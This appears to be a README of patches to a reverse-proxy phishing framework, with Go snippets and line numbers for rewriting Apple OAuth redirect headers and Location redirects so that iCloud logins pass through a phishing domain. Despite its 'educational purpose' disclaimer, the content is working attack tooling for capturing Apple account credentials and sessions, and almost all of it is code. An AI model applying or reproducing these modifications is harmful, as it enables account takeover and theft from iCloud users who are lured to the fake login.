# Phishlets
Educational Purpose !
This is only for Education Purpose not use for harming to anyone.

				//Replace User Agent Header
				useragent := req.Header.Get("X-Apple-Oauth-Redirect-Uri")
				if useragent != "" {
					req.Header.Set("X-Apple-Oauth-Redirect-Uri", "https://www.icloud.com")
					log.Debug("[%d] X-Apple-Oauth-Redirect-Uri: https://www.icloud.com", ps.Index)

				} 	
        
 line no 652 to 665      
			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					loc := resp.Header.Get("Location")
					if loc == "/auth" {
						resp.Header.Set("Location","/auth")
					} else {
						resp.Header.Set("Location", r_url.String())
					}
					
				} 
			}        
        
line no 408	
				// fix apple request header 
				ref := req.Header.Get("X-Apple-Oauth-Redirect-Uri")
				if ref != "" {
					if o_url, err := url.Parse(ref); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("X-Apple-Oauth-Redirect-Uri", o_url.String())
						}
					}
				}	
			

